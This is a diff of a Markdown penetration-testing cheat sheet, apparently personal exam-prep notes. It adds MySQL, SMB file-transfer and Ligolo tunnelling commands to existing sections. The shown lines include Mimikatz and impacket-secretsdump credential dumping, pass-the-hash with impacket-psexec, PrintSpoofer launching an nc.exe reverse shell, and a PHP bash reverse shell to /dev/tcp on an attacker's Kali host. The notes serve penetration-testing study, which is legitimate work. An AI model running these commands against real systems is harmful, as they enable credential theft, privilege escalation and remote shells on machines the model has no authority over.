@@ -44,11 +44,22 @@ On Linux, we can use the /etc/passwd file to test directory traversal vulnerabil
 
 ## RFI
 
+# SQL
+## mysql
+- From kali: mysql --host <IP> -u root -proot
+	- note that there is no space between -p flag and password
+- From target: mysql -u root -p root
+
+## mssql
+
 # SMB
 - smbclient -L \<target> -U \<user>
 - smbclient //\<target>/\<share> -U \<user>%\<password>
 - smbclient //\<target>/\<share> -U \<user> --pw-nt-hash \<NTLM hash>
-
+- smbclient //\<target>/\<share> --directory path/to/directory --command "get file.txt"
+	- to download file
+- smbclient //\<target>/\<share> --directory path/to/directory --command "put file.txt"
+	- to upload file
 # SMTP
 ### onesixtyone
 - onesixtyone -c \<file containing community strings (public, private, manager)> -i \<file containing target ips>
@@ -75,10 +86,11 @@ On Linux, we can use the /etc/passwd file to test directory traversal vulnerabil
 
 # Windows Foothold
 ## Enumeration
+### winpeas.exe
+
 
 ## Privilege Escalation
 ### Mimikatz
-
  1. privilege::debug
  2. token::elevate
  3. lsadump::sam
@@ -87,8 +99,8 @@ On Linux, we can use the /etc/passwd file to test directory traversal vulnerabil
 	 -  impacket-secretsdump -just-dc-user <user> \<domain.com>/\<user>:"\<password>"@\<ip>
 	 - impacket-psexec -hashes 00000000000000000000000000000000:\<NTLM hash> Administrator@\<IP> 
 
-### PrintSpoofer
-- .\PrintSpoofer.exe -c "nc.exe \<kali $IP> \<listening port> -e cmd"
+### Potato Family
+-PrintSpoofer: .\PrintSpoofer.exe -c "nc.exe \<kali $IP> \<listening port> -e cmd"
   
 
 # Linux Foothold
@@ -105,7 +117,23 @@ OR
 - find / -perm -u=s -type f 2>/dev/null
 - find / -user root -perm -4000 -exec ls -ldb {} \;
 
-  
+# Port Forwarding
+## Ligolo
+- From Kali:
+	- sudo ip tuntap add user pop mode tun ligolo
+	- sudo ip link set ligolo up
+	- sudo ip route add \<target ip.0/24> dev ligolo
+	- ./proxy -selfcert
+- From Windows Target (agent file):
+	- .\ligolo.exe -connect \<kali IP>:11601 -ignore-cert
+- From Linux Target (agent file):
+	- ligolo -connect \<kali IP>:11601 -ignore-cert
+- Then from Kali:
+	- Session
+	- 1
+	- Start
+	- listener_add --addr 0.0.0.0:5555 --to 127.0.0.1:6666
+		- This allows you to access port 5555 on target from 127.0.0.1:6666 (kali machine)
 
 # File Sharing
 
@@ -147,6 +175,8 @@ OR
 	    
 	    exec("/bin/bash -c 'bash -i >& /dev/tcp/<kali_IP>/<kali_port> 0>&1'");
 	    ?>
+
+
 
 
 
